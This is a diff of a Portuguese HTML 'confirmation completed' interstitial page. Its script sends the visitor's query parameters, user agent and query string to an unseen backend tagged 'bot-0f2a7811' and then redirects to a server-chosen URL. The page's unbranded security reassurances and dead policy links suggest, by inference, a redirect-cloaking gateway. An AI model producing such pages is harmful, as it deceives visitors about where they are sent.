@@ -3,7 +3,10 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Verificação</title>
+
+<title>Confirmação</title>
+
+<link rel="icon" href="favicon.ico">
 
 <style>
 *{
@@ -15,55 +18,67 @@
 body{
   font-family:Arial,sans-serif;
   background:#f8fafc;
-  display:flex;
-  justify-content:center;
-  align-items:center;
   min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
   padding:20px;
+  color:#111827;
+}
+
+.container{
+  width:100%;
+  max-width:380px;
 }
 
 .card{
-  width:100%;
-  max-width:360px;
   background:#fff;
-  border-radius:20px;
-  padding:30px 24px;
-  box-shadow:0 5px 20px rgba(0,0,0,.06);
   border:1px solid #e5e7eb;
+  border-radius:22px;
+  padding:32px 24px;
+  box-shadow:0 8px 30px rgba(0,0,0,.05);
   text-align:center;
 }
 
-.icon{
-  width:60px;
-  height:60px;
+.logo{
+  width:58px;
+  height:58px;
+  margin:0 auto 18px;
+  border-radius:16px;
   background:#eff6ff;
-  border-radius:18px;
   display:flex;
   align-items:center;
   justify-content:center;
-  margin:0 auto 20px;
 }
 
-.icon svg{
+.logo svg{
   width:28px;
   height:28px;
   fill:#2563eb;
 }
 
-h1{
-  font-size:24px;
-  color:#111827;
-  margin-bottom:10px;
-}
-
-p{
+.brand{
+  font-size:13px;
   color:#6b7280;
-  font-size:14px;
-  line-height:1.5;
+  margin-bottom:10px;
+  letter-spacing:.3px;
 }
 
-.box{
-  margin-top:20px;
+.title{
+  font-size:24px;
+  font-weight:700;
+  margin-bottom:12px;
+  color:#111827;
+}
+
+.desc{
+  font-size:14px;
+  line-height:1.6;
+  color:#6b7280;
+}
+
+.status{
+  margin-top:22px;
   padding:14px;
   border-radius:14px;
   background:#f9fafb;
@@ -75,12 +90,13 @@ p{
 .btn{
   width:100%;
   margin-top:24px;
-  padding:15px;
   border:none;
   border-radius:14px;
   background:#111827;
   color:#fff;
+  padding:15px;
   font-size:15px;
+  font-weight:600;
   cursor:pointer;
   transition:.2s;
 }
@@ -90,39 +106,70 @@ p{
 }
 
 .footer{
-  margin-top:16px;
+  margin-top:18px;
+  text-align:center;
   font-size:11px;
   color:#9ca3af;
+  line-height:1.6;
+}
+
+.links{
+  margin-top:10px;
+}
+
+.links a{
+  color:#9ca3af;
+  text-decoration:none;
+  margin:0 6px;
+}
+
+.links a:hover{
+  text-decoration:underline;
 }
 </style>
 </head>
 
 <body>
 
-<div class="card">
+<div class="container">
 
-  <div class="icon">
-    <svg viewBox="0 0 24 24">
-      <path d="M12 2L3 7v6c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V7l-9-5z"/>
-    </svg>
-  </div>
+  <div class="card">
 
-  <h1>Acesso disponível</h1>
+    <div class="logo">
+      <svg viewBox="0 0 24 24">
+        <path d="M12 2L3 7v6c0 5 3.8 9.7 9 11 5.2-1.3 9-6 9-11V7l-9-5z"/>
+      </svg>
+    </div>
 
-  <p>
-    Sua verificação foi concluída com sucesso.
-  </p>
+    <div class="brand">
+      Plataforma Digital
+    </div>
 
-  <div class="box">
-    Ambiente seguro carregado corretamente.
-  </div>
+    <div class="title">
+      Confirmação concluída
+    </div>
 
-  <button class="btn" id="continueBtn">
-    Continuar
-  </button>
+    <div class="desc">
+      Seu ambiente foi carregado corretamente e já está disponível para continuar.
+    </div>
 
-  <div class="footer">
-    conexão protegida
+    <div class="status">
+      Processamento finalizado com sucesso.
+    </div>
+
+    <button class="btn" id="continueBtn">
+      Prosseguir
+    </button>
+
+    <div class="footer">
+      conexão protegida
+
+      <div class="links">
+        <a href="#">Política de Privacidade</a>
+        <a href="#">Termos</a>
+      </div>
+    </div>
+
   </div>
 
 </div>
@@ -134,11 +181,12 @@ document.getElementById("continueBtn").addEventListener("click", async function(
 
   btn.innerHTML = "Carregando...";
   btn.disabled = true;
+  btn.style.opacity = ".8";
 
   try{
 
     const params = {};
-    
+
     new URLSearchParams(window.location.search)
     .forEach((v,k)=>{
       params[k] = v;
@@ -154,7 +202,8 @@ document.getElementById("continueBtn").addEventListener("click", async function(
         body:JSON.stringify({
           shortCode:"bot-0f2a7811",
           queryParams:params,
-          userAgent:navigator.userAgent
+          userAgent:navigator.userAgent,
+          urlCompleto:window.location.search.substring(1) || null
         })
       }
     );
@@ -162,13 +211,24 @@ document.getElementById("continueBtn").addEventListener("click", async function(
     const data = await response.json();
 
     if(data.redirectUrl){
-      window.location.href = data.redirectUrl;
+
+      setTimeout(()=>{
+        window.location.href = data.redirectUrl;
+      },600);
+
+    }else{
+
+      btn.innerHTML = "Prosseguir";
+      btn.disabled = false;
+      btn.style.opacity = "1";
+
     }
 
   }catch(e){
 
-    btn.innerHTML = "Continuar";
+    btn.innerHTML = "Prosseguir";
     btn.disabled = false;
+    btn.style.opacity = "1";
 
   }
 
